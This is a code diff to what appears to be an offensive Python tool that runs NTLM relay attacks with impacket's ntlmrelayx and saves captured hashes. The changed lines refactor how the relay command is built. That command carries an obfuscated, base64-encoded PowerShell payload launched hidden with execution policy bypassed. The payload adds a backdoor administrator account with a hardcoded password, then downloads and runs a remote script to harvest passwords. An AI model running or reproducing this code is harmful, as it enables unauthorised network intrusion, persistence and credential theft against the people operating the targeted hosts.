@@ -41,14 +41,14 @@ def parse_args():
     return parser.parse_args()
 
 # Colored terminal output
+def print_bad(msg):
+    print(colored('[-] ', 'red') + msg)
+
 def print_info(msg):
     print(colored('[*] ', 'blue') + msg)
 
 def print_good(msg):
     print(colored('[+] ', 'green') + msg)
-
-def print_bad(msg):
-    print(colored('[-] ', 'red') + msg)
 
 def print_great(msg):
     print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
@@ -811,11 +811,12 @@ def run_relay_attack(iface, args):
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
 
     if os.path.isfile('smb-signing-disabled-hosts.txt'):
-        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                     ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3 -c "{}"'.format(remote_cmd))
+        signing_disabled = ' -tf smb-signing-disabled-hosts.txt'
     else:
-        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                     ' -of hashes/ntlmrelay-hashes -wa 3 -c "{}"'.format(remote_cmd))
+        signing_disabled = ''
+    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                 ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(signing_disabled, remote_cmd))
+
     ntlmrelay_proc = run_proc(relay_cmd)
 
     return resp_proc, ntlmrelay_proc
